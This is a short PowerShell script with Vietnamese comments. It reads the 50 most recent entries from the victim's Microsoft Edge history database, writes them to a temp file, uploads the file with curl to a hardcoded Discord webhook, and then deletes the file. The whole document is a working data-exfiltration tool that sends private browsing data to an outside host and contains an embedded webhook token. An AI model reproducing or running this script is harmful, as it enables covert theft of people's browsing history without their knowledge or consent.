# Webhook Discord của bạn
$dc = "1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"   # hoặc nguyên URL
$whuri = "$dc"
if ($whuri.Length -lt 120){
    $whuri = ("https://discord.com/api/webhooks/" + "$dc")
}

# Đường dẫn file tạm để lưu kết quả
$outpath = "$env:TEMP\edge_history.txt"

# Đọc lịch sử Edge bằng SQLite
$edgeHistory = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"

if (Test-Path $edgeHistory) {
    Add-Type -AssemblyName System.Data
    $cn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$edgeHistory;Version=3;")
    $cn.Open()

    $cmd = $cn.CreateCommand()
    $cmd.CommandText = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50;"
    $rdr = $cmd.ExecuteReader()

    while ($rdr.Read()) {
        $url   = $rdr['url']
        $title = $rdr['title']
        $count = $rdr['visit_count']
        $time  = $rdr['last_visit_time']
        $epoch = [DateTime]::FromFileTimeUtc(10*$time + 116444736000000000)

        "$epoch | $count lần | $title | $url" | Out-File -FilePath $outpath -Append
    }

    $cn.Close()
} else {
    "Không tìm thấy file lịch sử Edge." | Out-File -FilePath $outpath -Append
}

# Gửi file lên Discord
curl.exe -F file1=@"$outpath" $whuri | Out-Null
Start-Sleep -Seconds 2
Remove-Item -Path $outpath -Force
